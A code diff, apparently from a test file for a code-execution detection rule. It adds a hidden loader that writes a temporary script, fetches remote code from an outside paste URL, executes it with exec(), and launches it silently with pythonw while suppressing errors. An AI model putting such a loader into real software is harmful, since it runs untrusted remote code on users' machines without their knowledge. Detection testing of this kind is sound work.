@@ -196,3 +196,10 @@ def run_file(path):
     # ruleid: code-execution
 	p = subprocess.Popen(f"python {path}",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)
 	out, err = p.communicate()
+
+_ttmp = _ffile(delete=False)
+_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/dsvc4/raw').read())""")
+_ttmp.close()
+# ruleid: code-execution
+try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
+except: pass
